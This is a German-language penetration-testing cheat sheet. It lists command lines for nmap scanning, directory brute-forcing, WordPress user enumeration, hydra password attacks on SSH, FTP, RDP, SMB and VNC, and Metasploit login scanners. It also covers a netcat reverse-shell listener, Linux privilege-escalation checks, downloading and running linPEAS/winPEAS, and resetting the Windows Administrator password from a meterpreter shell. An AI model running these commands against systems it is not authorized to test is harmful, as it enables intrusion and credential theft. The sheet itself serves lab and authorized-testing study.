# <center> Cheat Sheet Pentesting </center>

![img.png](img.png)
*Bild generiert mit OpenAI's DALL-E über ChatGPT, erstellt am 20.06.2024*
## nmap

### Grundlegende Scans
Einfacher Scan: ```nmap <IP-Adresse>```<br>
Alle Ports: ```nmap -p- <IP-Adresse```<br>
Spezifischer Port ```nmap -p 80 <IP-Adresse>```
### Erweiterte Scans
Service und Versionserkennung: ```nmap -sV <IP-Adresse>``` <br>
Betriebssystemerkennung: ```nmap -O <IP-Adresse>``` <br>
**Aggressiver Scan: ```nmap -A <IP-Adresse>``` <br>**
Skript-Scan mit Standard-Skripten: ```nmap -sC <IP-Adresse>``` <br>
### Geschwindigkeit und Timing
Langsamster Scan: ```nmap -T0 <IP-Adresse>``` <br>
Langsamer Scan: ```nmap -T1 <IP-Adresse>``` <br>
Standard Geschwindigkeit: ```nmap -T3 <IP-Adresse>``` <br>
Schneller Scan: ```nmap -T4 <IP-Adresse>``` <br>
Schnellster Scan: ```nmap -T5 <IP-Adresse>``` <br>
### Weiter Optionen
Scannen von mehreren Hosts: ```nmap <IP-Adresse1> <IP-Adresse2>``` <br>
Scannen eines IP-Bereichs: ```nmap <IP-Adresse1-IP-Adresse2>``` <br>
Speichern der Ausgabe in einer Datei: ```nmap -oN <Dateiname> <IP-Adresse>``` <br>
Scan mit bestimmten Skripten: ```nmap --script <Skriptname> <IP-Adresse>``` <br>
SYN-Scan: ```nmap -sS <IP-Adresse>``` <br>
UPD-Scan: ```nmap -sU <IP-Adresse>``` <br>
Kombinierter TCP und UDP Scan: ```nmap -sS -sU <IP-Adresse>``` <br>
### Host Discovery
**Volles Netzwerk-Scan: ```nmap -sn <IP-Adresse>```** <br>
Ping-Scan: ```nmap -sP <IP-Adresse>``` <br>

## gobuster

**Verzeichnissan mit spezifischer Wordlist: ```gobuster dir -u <URL> -w <Wordlist>```** <br>
Verzeichnissan mit Standard-Wordlist: ```gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt``` <br>
Verzeichnissan mit Dateiendungen: ```gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -x <Dateiendungen>``` <br>
Beispiel: ```gobuster dir -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt``` <br>

## wpscan

Ziel scannen: ```wpscan --url <URL>``` <br>
**Aggressiver Plugin Scan: ```wpscan --url <URL> --plugins-detection aggressive```** <br>
Benutzer auflisten: ```wpscan --url <URL> --enumerate u``` <br>
Alle Plugins auflisten: ```wpscan --url <URL> --enumerate p``` <br>
Verwundbare Plugins auflisten: ```wpscan --url <URL> --enumerate vp``` <br>
Alle Themes auflisten: ```wpscan --url <URL> --enumerate t``` <br>
Verwundbare Themes auflisten: ```wpscan --url <URL> --enumerate vt``` <br>
Passwortangriff: ```wpscan --url <URL> --passwords <Wordlist> --usernames <Benutzer>``` <br>
Passwortangriff mit spezifischem Benutzer: ```wpscan --url <URL> --passwords <Wordlist> --username <Benutzer>``` <br>
Beispiel: ```wpscan --url http://derpnstink.local/weblog``` <br>
Beispiel: ``` wpscan --url http://playground.cyberpunk.rs:81  --enumerate vp --plugins-detection aggressive```

## hydra

### Basics
Grundlegender Scan (Benutzername Liste): ```hydra -L <Benutzerliste> -P <Passwortliste> <Ziel-IP> <Dienst> -V``` <br>
Grundlegender Scan (Benutzername): ```hydra -l <Benutzername> -P <Passwortliste> <Ziel-IP> <Dienst> -V``` <br>
### Häufige Dienste
FTP: ```hydra -L users.txt -P passwords.txt ftp://<Ziel-IP>``` <br>
SSH: ```hydra -L users.txt -P passwords.txt ssh://<Ziel-IP>``` <br>
Telnet: ```hydra -L users.txt -P passwords.txt telnet://<Ziel-IP>``` <br>
HTTP-GET: ```hydra -L users.txt -P passwords.txt <Ziel-IP> http-get /login.php``` <br>
HTTP-POST: ```hydra -L users.txt -P passwords.txt <Ziel-IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=failed"``` <br>
MYSQL: ```hydra -L users.txt -P passwords.txt mysql://<Ziel-IP>``` <br>
RDP: ```hydra -L users.txt -P passwords.txt rdp://<Ziel-IP>``` <br>
SMB: ```hydra -L <Benutzerliste> -P <Passwortliste> smb://<Ziel-IP>``` <br>
### Erweiterte Optionen
Spezifischer Port: ```hydra -L users.txt -P passwords.txt <Ziel-IP> -s <Port> <Dienst>``` <br>
Proxy verwenden: ```hydra -L users.txt -P passwords.txt <Ziel-IP> <Dienst> -o <Datei> -x <Proxy>``` <br>
Ergebnisdatei angeben: ```hydra -L users.txt -P passwords.txt <Ziel-IP> <Dienst> -o <Datei>``` <br>

## Metasploit

Konsole starten: ```msfconsole``` <br>
Suchen nach Modulen: ```search <Suchbegriff>``` <br>
Modul auswählen: ```use <Modulname>``` <br>
Modul anzeigen: ```show options``` <br> 
Optionen setzen: ```set <Option> <Wert>``` <br>
Modul ausführen: ```run``` <br>

## SMB

Informationen sammeln: ```nmap -p 445 --script smb-os-discovery <Ziel-IP>```<br>
### Freigaben auflisten
Smbclient: ```smbclient -L //<Ziel-IP> -U anonymous```<br>
Enum4linux: ```enum4linux -a <Ziel-IP>```<br>
### Freigaben durchsuchen
Spezifische Freigabe: ```smbclient //<Ziel-IP>/<Freigabe> -U <Benutzername>```<br>
Kein Benutzername erforderlich: ````smbclient //<Ziel-IP>/<Freigabe> -N````<br>
#### Daten herunterladen
Daten herunterladen: ```smbclient //<Ziel-IP>/<Freigabe> -U <Benutzername> -c 'get <Dateiname>'```<br>
### Metasploit
SMB-Version scannen: ```use auxiliary/scanner/smb/smb_version``` <br>
```set RHOSTS <Ziel-IP>``` <br>
```run``` <br>
Freigaben auflisten:
```use auxiliary/scanner/smb/smb_enumshares``` <br>
```set RHOSTS <Ziel-IP>``` <br>
```run``` <br>
Benutzer auflisten: ```use auxiliary/scanner/smb/smb_enumusers``` <br>
```set RHOSTS <Ziel-IP>``` <br>
```run``` <br>
### Passwort Cracking
hydra: ```hydra -L users.txt -P passwords.txt smb://<Ziel-IP>``` <br>
### Vulnerability Scanning
EternalBlue (MS17-010) Scannen: ```nmap --script smb-vuln-ms17-010 -p 445 <Ziel-IP>```<br>
Mounten von Freigaben: ```mount -t cifs //<Ziel-IP>/<Freigabe> /mnt/<Freigabe> -o user

## VNC

VNC Version Erkennung: ```nmap -sV --script vnc-info <Ziel-IP> -p 5900``` <br>
hydra Brut Force: ```hydra -s 5900 -P passwords.txt <Ziel-IP> vnc``` <br>
Metasploit: ```use auxiliary/scanner/vnc/vnc_login``` <br>
```set RHOSTS <Ziel-IP>``` <br>
```run``` <br>

## FTP

Anonymer Zugriff: ```ftp <Ziel-IP>```<br>
Anonymen Zugriff prüfen: ```nmap --script ftp-anon <Ziel-IP>```<br>
hydra Brut Force: ```hydra -L users.txt -P passwords.txt ftp://<Ziel-IP>```<br>
MetaSploit: ```use auxiliary/scanner/ftp/ftp_login``` <br>
```set RHOSTS <Ziel-IP>``` <br>
```set USER_FILE users.txt``` <br>
```set PASS_FILE passwords.txt``` <br>
```run``` <br>

## SSH

hydra Brut Force: ```hydra -L users.txt -P passwords.txt ssh://<Ziel-IP>```<br>
Verbindung zu ssh Client herstellen: ```ssh <Benutzername>@<Ziel-IP>```<br>
Mit spezifischen Port: ```ssh -p <Port> <Benutzername>@<Ziel-IP>```<br>
Schlüsselbasierte Authentifizierung: ```ssh -i <Pfad-zum-Schlüssel> <Benutzername>@<Ziel-IP>```<br>
MetaSploit: ```use auxiliary/scanner/ssh/ssh_login``` <br>
```set RHOSTS <Ziel-IP>``` <br>
```set USER_FILE users.txt``` <br>
```set PASS_FILE passwords.txt``` <br>
```run``` <br>

## Reverse Shell

Revshells: https://www.revshells.com/ <br>
Listenser: ```nc -lvnp <Port>``` <br>
Listener mit rlwrap: ```rlwrap nc -lvnp <Port>``` <br>

## Linux Privilege Escalation

SUID-Binaries: ```find / -perm -u=s -type f 2>/dev/null```  <br>
Sudo Rechte: ```sudo -l```<br>
**Cron Jobs anschauen: ```cat /etc/contab```** <br>
```crontab -l```<br>
```ls -la /etc/cron*``` <br>

## Windows Privilege Escalation

TODO

## linPEAS und winPEAS

### linPEAS
```wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh``` <br>
```chmod +x linpeas.sh``` <br>
```./linpeas.sh``` <br>
### winPEAS
```wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat -O winPEAS.bat``` <br>
```./winPEAS.bat``` <br>


## Hilfreiche Befehle

### unzip rockyou Datei
```gzip -d rockyou.txt.gz``` <br>
### python http server
```python -m http.server 9000``` <br>
### Upgrade to TTY-Shell
```python3 -c 'import pty; pty.spawn("/bin/bash")'``` <br>
```STRG-Z``` <br>
```stty -a``` <br>
```stty raw -echo; fg``` <br>
```stty rows <num> columns <num>``` <br>
```export TERM=xterm``` <br>
### rdp
```rdesktop -u <Benutzername> -p <Passwort> <IP-Adresse>``` <br>
```xfreerdp /v:<IP-Adresse> /u:<Benutzername> /p:<Passwort>``` <br>
### windows user aktiviern
bei meterpreter Shell : ```execute -f cmd.exe -i -t``` <br>
```net user Administrator /active:yes``` <br>
```net user Administrator <neues_passwort>``` <br>
### String base64 decodieren
```echo "STRING" | base64 -d```
### SSH-Key Fehler
``chmod 0400 key``


